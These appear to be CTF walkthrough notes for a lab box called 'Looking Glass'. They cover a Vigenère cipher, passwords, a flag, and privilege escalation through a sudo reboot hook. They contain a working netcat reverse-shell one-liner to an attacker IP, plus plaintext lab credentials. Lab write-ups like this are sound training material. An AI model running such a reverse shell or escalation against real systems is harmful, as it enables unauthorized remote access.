# Looking Glass

> John Hammond | August 17th, 2020

----------------------

```
export IP=10.10.186.211
```


Real service is on 12787
THIS PORT CHANGES EVERY TIME

```
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
```

Vignere cipher with key `thealphabetcipher`


The secret is: `bewareTheJabberwock`



Gives password:

```
jabberwock:ComparedSmallWhileListened
```

THIS PASSWORD CHANGES EVERY TIME!

ComparedSmallWhileListened
LightCastlesDecidedlyMutton
JoinedBeardSlippedDismal
TrainsDistinctFlushedTwists
DoubtfulClaspingShoutedCommon


user.txt
```
thm{65d3710e9d75d5f346d2bac669119a23}
```


This user can `sudo reboot` without a password, and upon
reboot, `tweetledum` will run the script in the home directory. We can use this to get into that user.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.2.132 4444 >/tmp/f
```

As this `tweedledum` user, we see a `humptydumpty.txt` file.

```
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Decoding that with `xxd -r -p`, we see:

```
the password is zyxwvutsrqponmlk
```

This is the password for the `humptydumpty` user.
We cannot seem to SSH in with that. Even changing the password does not allow us to log in.

We do see a new file, `poetry.txt`


Why is there `lxc` here? Why is there a `/tmp/tmux-4`?